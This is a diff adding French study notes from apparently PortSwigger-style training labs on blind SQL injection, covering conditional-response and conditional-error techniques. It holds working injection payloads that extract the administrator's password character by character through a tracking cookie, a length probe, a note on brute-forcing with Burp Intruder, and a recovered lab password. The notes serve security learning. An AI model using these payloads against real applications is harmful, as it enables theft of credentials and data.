@@ -1,1 +1,37 @@
+l'on peut tenter une injection SQL dans le trackingId du cookie car l'utilisation de cette ID emploi une requetes SQL de ce type : SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '....'
+pour forcer une reaction l'on va completer la requete par …xyz' AND '1'='1 / …xyz' AND '1'='2  et nous pourrons donc savoir si une requete que l'on met est vrai ou fausse
+l'on peut directement convertir cette requete pour obtenir le contenu d'un mdp : xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
+
+# LAB 1 : Lab: Blind SQL injection with conditional responses
+
+Objectif: tester des conditions vrai (1=1) et des conditions fausse (1=2) pour pouvoir observer les differentes reactions visibles 
+
+Test: cookie tracking ID : wUD55nJv0PZGdVvd'AND+1=1--  un  message apparaît dans la réponse. Welcome back     &  pour  wUD55nJv0PZGdVvd'AND+1=2-- rien n'apparait
+
+Par consequent l'on peu donc trouver un mdp en testant chaque element et en cherchant un Welcome Back pour cela on va utiliser un outil de Burpsuite pour tester chaque element de l'aphabet mais egalement les chiffres
+ne pas oublier les majuscules
+
+(Pour trouver la taille l'on utilise cette requete :  wUD55nJv0PZGdVvd'AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>2)='a'-- )  et l'on voit que le mdp est de taille 20
+
+MDP rouver avec intruder : j365dxr8inudcilxqoyb
+
+
+------------------------------------
+
+
+Certaines applications effectuent des requêtes SQL mais leur comportement ne change pas, que la requête renvoie ou non des données. La technique de la section précédente ne fonctionnera pas,
+car injecter différentes conditions booléennes ne change rien aux réponses de l’application.
+Il est souvent possible d’induire l’application à répondre différemment selon qu’une erreur SQL survient ou non. Vous pouvez modifier la requête pour qu’elle ne provoque
+une erreur de base de données que si la condition est vraie. Très souvent, une erreur non traitée générée par la base de données provoque une différence dans la réponse de l’application,
+comme un message d’erreur. Cela vous permet d’inférer la véracité de la condition injectée.
+
+Pour comprendre comment cela fonctionne, supposons que deux requêtes soient envoyées contenant successivement les valeurs de cookies suivantes : TrackingId
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a    VRAI 
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a FAUX 
+
+
+Par consequent l'on peut directement convertir ces requetes en requete interessante :
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+# LAB 2 : Lab: Blind SQL injection with conditional errors
 
